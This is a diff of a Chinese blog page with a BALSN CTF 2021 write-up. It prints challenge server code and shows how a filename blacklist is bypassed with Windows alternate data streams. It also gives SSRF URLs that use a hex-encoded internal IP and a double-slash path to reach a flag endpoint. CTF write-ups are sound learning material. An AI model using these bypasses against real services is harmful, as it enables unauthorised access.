-            flag &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
-    
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; flag:
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
+    safety_guard()
 
-&lt;span style=&quot;color:#66d9ef&quot;&gt;try&lt;/span&gt;:
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;with&lt;/span&gt; open(pin, &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;) &lt;span style=&quot;color:#66d9ef&quot;&gt;as&lt;/span&gt; f:
-        data &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; f&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;read()&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;split(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&quot;color:#ae81ff&quot;&gt;\n&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(data) &lt;span style=&quot;color:#f92672&quot;&gt;!=&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;2&lt;/span&gt;:
-            print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;unknown error happened??&amp;#34;&lt;/span&gt;)
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;None&lt;/span&gt;, &lt;span style=&quot;color:#66d9ef&quot;&gt;None&lt;/span&gt;
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt; data[&lt;span style=&quot;color:#ae81ff&quot;&gt;0&lt;/span&gt;], data[&lt;span style=&quot;color:#ae81ff&quot;&gt;1&lt;/span&gt;]
-&lt;span style=&quot;color:#66d9ef&quot;&gt;except&lt;/span&gt; &lt;span style=&quot;color:#a6e22e&quot;&gt;FileNotFoundError&lt;/span&gt;:
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;this pin code is not registered.&amp;#34;&lt;/span&gt;)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;None&lt;/span&gt;, &lt;span style=&quot;color:#66d9ef&quot;&gt;None&lt;/span&gt;
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>normal_login</span>():
-<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
-username <span style=color:#f92672>=</span> input(<span style=color:#e6db74>"enter username > "</span>)</p><pre><code>    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(username) &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;100&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;too long...&amp;#34;&lt;/span&gt;)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; username&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;isalnum() &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;strange username, huh?&amp;#34;&lt;/span&gt;)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; username &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;no you are definitely not (╬ Ò ‸ Ó)&amp;#34;&lt;/span&gt;)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;else&lt;/span&gt;:
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        print(<span style=color:#e6db74>&#34;1. fast login&#34;</span>)
+        print(<span style=color:#e6db74>&#34;2. normal login&#34;</span>)
+        print(<span style=color:#e6db74>&#34;3. exit&#34;</span>)
+        x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter login type &gt; &#34;</span>)
+        <span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>:
+            username, password <span style=color:#f92672>=</span> fast_login()
+        <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>:
+            username, password <span style=color:#f92672>=</span> normal_login()
+        <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;3&#34;</span>:
+            print(<span style=color:#e6db74>&#34;bye-bye~&#34;</span>)
+            <span style=color:#66d9ef>return</span>
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#34;invalid input.&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
 
-&lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-    password &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;enter password &amp;gt; &amp;#34;&lt;/span&gt;)
+        <span style=color:#66d9ef>if</span> username <span style=color:#f92672>!=</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>and</span> password <span style=color:#f92672>!=</span> <span style=color:#66d9ef>None</span>:
+            print(f<span style=color:#e6db74>&#34;hello, </span><span style=color:#e6db74>{username}</span><span style=color:#e6db74>.&#34;</span>)
+            <span style=color:#66d9ef>if</span> username <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>:
+                <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+                    x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;do you want the flag? (y/n): &#34;</span>)
+                    <span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;n&#34;</span>:
+                        print(<span style=color:#e6db74>&#34;OK, bye~&#34;</span>)
+                        <span style=color:#66d9ef>return</span>
+                    <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;y&#34;</span>:
+                        <span style=color:#66d9ef>break</span>
+                    <span style=color:#66d9ef>else</span>:
+                        print(<span style=color:#e6db74>&#34;invalid input.&#34;</span>)
+                <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+                    x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;beg me: &#34;</span>)
+                    <span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;plz&#34;</span>:
+                        print(<span style=color:#e6db74>&#34;ok, here is your flag: BALSN{flag is here ...}&#34;</span>)
+                        <span style=color:#66d9ef>break</span>
+            <span style=color:#66d9ef>return</span>
 
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(password) &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;100&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;too long...&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; password&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;isalnum() &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;strange password, huh?&amp;#34;&lt;/span&gt;)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;else&lt;/span&gt;:
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+    init()
 
-&lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt; username, password
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
-safety_guard()</p><pre><code>&lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;1. fast login&amp;#34;&lt;/span&gt;)
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;2. normal login&amp;#34;&lt;/span&gt;)
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;3. exit&amp;#34;&lt;/span&gt;)
-    x &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;enter login type &amp;gt; &amp;#34;&lt;/span&gt;)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;:
-        username, password &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; fast_login()
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;:
-        username, password &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; normal_login()
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;bye-bye~&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt;
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;else&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;invalid input.&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
+    <span style=color:#66d9ef>try</span>:
+        <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+            print(<span style=color:#e6db74>&#34;1. passord manager&#34;</span>)
+            print(<span style=color:#e6db74>&#34;2. login&#34;</span>)
+            print(<span style=color:#e6db74>&#34;3. exit&#34;</span>)
+            x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;what do you want to do? &gt; &#34;</span>)
+            <span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>:
+                password_manager()
+            <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>:
+                login()
+            <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;3&#34;</span>:
+                print(<span style=color:#e6db74>&#34;bye-bye~&#34;</span>)
+                <span style=color:#66d9ef>break</span>
+            <span style=color:#66d9ef>else</span>:
+                print(f<span style=color:#e6db74>&#34;invalid input: </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>&#34;</span>)
+    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
+        print(<span style=color:#e6db74>&#34;bye-bye~&#34;</span>)
+    <span style=color:#66d9ef>except</span>:
+        print(<span style=color:#e6db74>&#34;unexpected error occured.&#34;</span>)
 
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; username &lt;span style=&quot;color:#f92672&quot;&gt;!=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;None&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;and&lt;/span&gt; password &lt;span style=&quot;color:#f92672&quot;&gt;!=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;None&lt;/span&gt;:
-        print(f&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;hello, &lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;{username}&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;.&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; username &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;:
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-                x &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;do you want the flag? (y/n): &amp;#34;&lt;/span&gt;)
-                &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;:
-                    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;OK, bye~&amp;#34;&lt;/span&gt;)
-                    &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt;
-                &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;y&amp;#34;&lt;/span&gt;:
-                    &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
-                &lt;span style=&quot;color:#66d9ef&quot;&gt;else&lt;/span&gt;:
-                    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;invalid input.&amp;#34;&lt;/span&gt;)
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-                x &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;beg me: &amp;#34;&lt;/span&gt;)
-                &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;plz&amp;#34;&lt;/span&gt;:
-                    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;ok, here is your flag: BALSN{flag is here ...}&amp;#34;&lt;/span&gt;)
-                    &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt;
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
-init()</p><pre><code>&lt;span style=&quot;color:#66d9ef&quot;&gt;try&lt;/span&gt;:
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;1. passord manager&amp;#34;&lt;/span&gt;)
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;2. login&amp;#34;&lt;/span&gt;)
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;3. exit&amp;#34;&lt;/span&gt;)
-        x &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;what do you want to do? &amp;gt; &amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;:
-            password_manager()
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;:
-            login()
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;elif&lt;/span&gt; x &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;:
-            print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;bye-bye~&amp;#34;&lt;/span&gt;)
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;else&lt;/span&gt;:
-            print(f&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;invalid input: &lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;{x}&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;)
-&lt;span style=&quot;color:#66d9ef&quot;&gt;except&lt;/span&gt; &lt;span style=&quot;color:#a6e22e&quot;&gt;KeyboardInterrupt&lt;/span&gt;:
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;bye-bye~&amp;#34;&lt;/span&gt;)
-&lt;span style=&quot;color:#66d9ef&quot;&gt;except&lt;/span&gt;:
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;unexpected error occured.&amp;#34;&lt;/span&gt;)
+    os<span style=color:#f92672>.</span>chdir(<span style=color:#e6db74>&#34;../&#34;</span>)
+    shutil<span style=color:#f92672>.</span>rmtree(base_dir)
 
-os&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;chdir(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;../&amp;#34;&lt;/span&gt;)
-shutil&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;rmtree(base_dir)
-</code></pre><p><span style=color:#66d9ef>if</span> <strong>name</strong> <span style=color:#f92672>==</span> <span style=color:#e6db74>"<strong>main</strong>"</span>:
-main()</code></pre></div><h3 id=目標-1>目標</h3></p><p>使用login選項成功登入admin</p><h3 id=限制-1>限制</h3><ul><li>用 normal_login 會直接被檔</li><li>login 前，所有在 passord manager 所建立的 fast_login 檔若包含&rsquo;admin&rsquo;會被刪</li><li>做 passord manager 時 pin(filename) 不可包含['\&rsquo;, &lsquo;/&rsquo;, &lsquo;..&rsquo;, &lsquo;*'] 字串</li></ul><h3 id=payload-1>payload</h3><p>因為 server 是 windows os ，所以可以用alternate_stream_name繞過 如：C:\user\docs\somefile.ext:alternate_stream_name</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@jimmyGW:~# nc darkknight.balsnctf.com <span style=color:#ae81ff>8084</span>
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><h3 id=目標-1>目標</h3><p>使用login選項成功登入admin</p><h3 id=限制-1>限制</h3><ul><li>用 normal_login 會直接被檔</li><li>login 前，所有在 passord manager 所建立的 fast_login 檔若包含&rsquo;admin&rsquo;會被刪</li><li>做 passord manager 時 pin(filename) 不可包含['\&rsquo;, &lsquo;/&rsquo;, &lsquo;..&rsquo;, &lsquo;*'] 字串</li></ul><h3 id=payload-1>payload</h3><p>因為 server 是 windows os ，所以可以用alternate_stream_name繞過 如：C:\user\docs\somefile.ext:alternate_stream_name</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@jimmyGW:~# nc darkknight.balsnctf.com <span style=color:#ae81ff>8084</span>
 1. passord manager
 2. login
 3. exit
@@ -452,7 +500,7 @@ bye-bye~
 <img src=https://user-images.githubusercontent.com/57281249/142795368-4b9539c1-702b-4209-af46-7158f9f4362a.png alt=image></p><p>試著 <a href="http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307">http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307</a>
 <img src=https://user-images.githubusercontent.com/57281249/142795389-217d6af0-0418-4c8b-ae17-05aa3bcd09ee.png alt=image></p><p>試著 <a href="http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag">http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag</a></p><p>炸
 <img src=https://user-images.githubusercontent.com/57281249/142795401-d274d047-1b98-4180-bc4c-60860610af34.png alt=image></p><p>試著 <a href="http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag">http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag</a></p><p>過
-<img src=https://user-images.githubusercontent.com/57281249/142795421-f5b07089-8ff3-4796-b1e3-f02de4d24734.png alt=image></p><h3 id=flag-2>flag</h3><p>BALSN{default_istio_service_mesh_envoy_configurations}</p></article></div></div><div class="col-sm-12 col-md-12 col-lg-3"><div class=sticky-sidebar><aside class=toc><h5>Table Of Contents</h5><div class=toc-content><nav id=TableOfContents><ul><li><a href=#戰績>戰績</a></li><li><a href=#metaeasy>Metaeasy</a><ul><li><a href=#題目>題目</a></li><li><a href=#server-code>server code</a></li><li><a href=#目標>目標</a></li><li><a href=#限制>限制</a></li><li><a href=#payload>payload</a></li><li><a href=#flag>flag</a></li><li><a href=#參考>參考</a></li></ul></li><li><a href=#darkknight>DarkKnight</a><ul><li><a href=#題目-1>題目</a></li><li><a href=#server-code-1>server code</a></li><li><a href=#目標-1>目標</a></li><li><a href=#限制-1>限制</a></li><li><a href=#payload-1>payload</a></li><li><a href=#flag-1>flag</a></li><li><a href=#參考-1>參考</a></li></ul></li><li><a href=#darkknight-1>DarkKnight</a><ul><li><a href=#題目-2>題目</a></li><li><a href=#解題>解題</a></li><li><a href=#flag-2>flag</a></li></ul></li></ul></nav></div></aside><aside class=tags><h5>Tags</h5><ul class="tags-ul list-unstyled list-inline"><li class=list-inline-item><a href=https://blog.chummydns.com/tags/ctf target=_blank>CTF</a></li></ul></aside><aside class=social><h5>Social</h5><div class=social-content><ul class=list-inline><li class="list-inline-item text-center"><a target=_blank href="https://twitter.com/share?text=BALSN%202021%20WriteUp&url=https%3a%2f%2fblog.chummydns.com%2fblogs%2fbalsn-2021-writeup%2f"><i class="fab fa-twitter"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="https://api.whatsapp.com/send?text=BALSN%202021%20WriteUp: https%3a%2f%2fblog.chummydns.com%2fblogs%2fbalsn-2021-writeup%2f"><i class="fab fa-whatsapp"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="mailto:?subject=BALSN%202021%20WriteUp&body=Check%20out%20this%20site https%3a%2f%2fblog.chummydns.com%2fblogs%2fbalsn-2021-writeup%2f"><i class="fa fa-envelope"></i></a></li></ul></div></aside></div></div></div><div class=row><div class="col-sm-12 col-md-12 col-lg-9 p-4"></div></div></div><button class="p-2 px-3" onclick=topFunction() id=topScroll>
+<img src=https://user-images.githubusercontent.com/57281249/142795421-f5b07089-8ff3-4796-b1e3-f02de4d24734.png alt=image></p><h3 id=flag-2>flag</h3><p>BALSN{default_istio_service_mesh_envoy_configurations}</p></article><img src="https://count.wellard.org/get/@chumyblog1d4b1513a3041b76aa819f7bb90b63fc?theme=rule34" alt=count></div></div><div class="col-sm-12 col-md-12 col-lg-3"><div class=sticky-sidebar><aside class=toc><h5>Table Of Contents</h5><div class=toc-content><nav id=TableOfContents><ul><li><a href=#戰績>戰績</a></li><li><a href=#metaeasy>Metaeasy</a><ul><li><a href=#題目>題目</a></li><li><a href=#server-code>server code</a></li><li><a href=#目標>目標</a></li><li><a href=#限制>限制</a></li><li><a href=#payload>payload</a></li><li><a href=#flag>flag</a></li><li><a href=#參考>參考</a></li></ul></li><li><a href=#darkknight>DarkKnight</a><ul><li><a href=#題目-1>題目</a></li><li><a href=#server-code-1>server code</a></li><li><a href=#目標-1>目標</a></li><li><a href=#限制-1>限制</a></li><li><a href=#payload-1>payload</a></li><li><a href=#flag-1>flag</a></li><li><a href=#參考-1>參考</a></li></ul></li><li><a href=#darkknight-1>DarkKnight</a><ul><li><a href=#題目-2>題目</a></li><li><a href=#解題>解題</a></li><li><a href=#flag-2>flag</a></li></ul></li></ul></nav></div></aside><aside class=tags><h5>Tags</h5><ul class="tags-ul list-unstyled list-inline"><li class=list-inline-item><a href=https://blog.chummydns.com/tags/ctf target=_blank>CTF</a></li></ul></aside><aside class=social><h5>Social</h5><div class=social-content><ul class=list-inline><li class="list-inline-item text-center"><a target=_blank href="https://twitter.com/share?text=BALSN%202021%20WriteUp&url=https%3a%2f%2fblog.chummydns.com%2fblogs%2fbalsn-2021-writeup%2f"><i class="fab fa-twitter"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="https://api.whatsapp.com/send?text=BALSN%202021%20WriteUp: https%3a%2f%2fblog.chummydns.com%2fblogs%2fbalsn-2021-writeup%2f"><i class="fab fa-whatsapp"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="mailto:?subject=BALSN%202021%20WriteUp&body=Check%20out%20this%20site https%3a%2f%2fblog.chummydns.com%2fblogs%2fbalsn-2021-writeup%2f"><i class="fa fa-envelope"></i></a></li></ul></div></aside></div></div></div><div class=row><div class="col-sm-12 col-md-12 col-lg-9 p-4"></div></div></div><button class="p-2 px-3" onclick=topFunction() id=topScroll>
 <i class="fas fa-angle-up"></i></button></section><div class=progress><div id=scroll-progress-bar class=progress-bar role=progressbar aria-valuenow=0 aria-valuemin=0 aria-valuemax=100></div></div><script src=/js/scrollProgressBar.js></script><script>var topScroll=document.getElementById("topScroll");window.onscroll=function(){scrollFunction()};function scrollFunction(){if(document.body.scrollTop>20||document.documentElement.scrollTop>20){topScroll.style.display="block";}else{topScroll.style.display="none";}}
 function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}</script><script src=/js/readingTime.js></script></div><footer><div class="container py-3" id=recent-posts><div class="h3 text-center text-secondary py-3">Recent Posts</div><div class="row justify-content-center"><div class="col-lg-4 col-md-6 pt-2"><div class="card h-100"><div class="card-body bg-transparent p-3 shadow-sm"><a href=/blogs/analysis_linux_host_by_tcp_timestamp/ class="primary-font card-title"><h5 class="card-title bg-transparent" title="利用 TCP 的 Timestamps 做到精準分類來源 linux machine">利用 TCP 的 Timestamps 做到精準分 …</h5></a><div class="card-text secondary-font"><p>利用 TCP 的 Timestamps 做到分類來源 linux machine 緣由 會做這個的原因是因為要打今年的 AIS3 EOF 要做封包的分析工具，然而按照 HITCON CTF 與往年 AIS3 EOF 的經驗，我們是沒辦法取得每個隊伍的 SRC IP 的，也就是說無法辨識出這個 request 是屬於哪一個隊伍的。
 這會造成甚麼問題，假設有一個 HTTP Post Auth 的 RCE 好了，可能會需要這些流程。
